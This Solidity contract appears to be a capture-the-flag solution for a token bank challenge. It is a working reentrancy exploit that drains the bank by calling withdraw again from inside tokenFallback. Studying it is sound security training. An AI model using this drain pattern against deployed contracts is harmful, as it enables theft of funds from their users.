// SPDX-License-Identifier: MIT
pragma solidity ^0.4.21;

import "./TokenBankChallenge.sol";

contract Player {
    TokenBankChallenge public bank;

    function Player(address _bank) public {
        bank = TokenBankChallenge(_bank);
    }

    function deposit() external payable {
        uint256 amount = bank.token().balanceOf(this);
        bank.token().transfer(bank, amount);
    }

    function attack(uint256 amount) public {
        bank.withdraw(bank.balanceOf(this));
        require(bank.isComplete());
    }

    function tokenFallback(address from, uint256 value, bytes) public {
        require(msg.sender == address(bank.token()));

        if (from != address(bank)) return;

        uint256 bankBalance = bank.token().balanceOf(bank);
        if (bankBalance > 0) {
            uint256 amount = bankBalance > value ? value : bankBalance;
            bank.withdraw(amount);
        }
    }
}
